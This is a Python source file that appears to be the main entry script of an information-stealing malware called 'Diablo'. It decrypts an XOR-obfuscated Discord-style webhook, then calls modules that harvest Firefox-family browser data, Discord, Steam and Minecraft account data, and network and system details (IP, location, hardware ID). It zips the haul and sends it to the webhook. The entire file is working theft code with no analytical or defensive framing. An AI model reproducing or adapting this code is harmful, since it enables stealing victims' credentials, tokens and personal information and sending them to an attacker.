import base64 , hashlib

from modules.browsers.gecko import Gecko
from modules.discord import Discord
from modules.steam import Steam
from modules.minecraft import Minecraft
from modules.network import Network
from modules.system import System
from utils.vault import Vault , V_PATH

from os.path import join as join_path



def XOR(key : str , content : str):

    output = ''

    for index in range(len(content)):

        char = content[index]

        output += chr(ord(char) ^ ord(key[index % len(key)]))

    return output



class DiabloWebHookConfig:

    

    def __init__(self , wh , key) -> None:
        
        self.webhook = XOR(base64.b64decode(key).decode() , wh) #DE/XOR

    def __str__(self) -> str:
        
        return self.webhook
    

KEY    =    'OTk1OTI1MTdjNg==' # encoded key
WH     =    b'QMAIA\x0f\x1e\x18\x07_JZZKV\x1bRX\x0e\x19XI\\\x16EPS_\x0cYRJ\x1a\x08\x03\r\x07\x00T\x04\x0c\x0b\x0c\x0b\x05\x02\x02\x06P\x04\x0f\x0c\x1asmgsp\x0f\x1bQV`rw\x04if\x15\x1b@X\x18O\x0b\x07zD.pvzS\t\x03W\x06T5\x07\x7f\tq{\x00A`x\x06dcWeTs]^S\x04BZMMr^M\\b6gx' # encrypted webhook


webhook_CONFIG = DiabloWebHookConfig (
    WH.decode(),
    KEY
)

webhook =   str(webhook_CONFIG)

Vault.init()

Gecko.exfil(join_path(V_PATH , 'Browser Data'))

Discord.exfil(join_path(V_PATH , 'Discord'))

Minecraft.exfil(join_path(V_PATH , 'Minecraft'))

Steam.exfil(join_path(V_PATH , 'Steam'))

ip , loc , cnt , city = Network.exfil(join_path(V_PATH , 'Network'))

hwid = System.exfil(join_path(V_PATH , 'System'))


Vault.zip_vault()

Vault.send_full_vault_with_data(webhook , {
    'hwid' : hwid,
    'ip' : ip,
    'loc' : loc,
    'country' : cnt,
    'city' : city
})

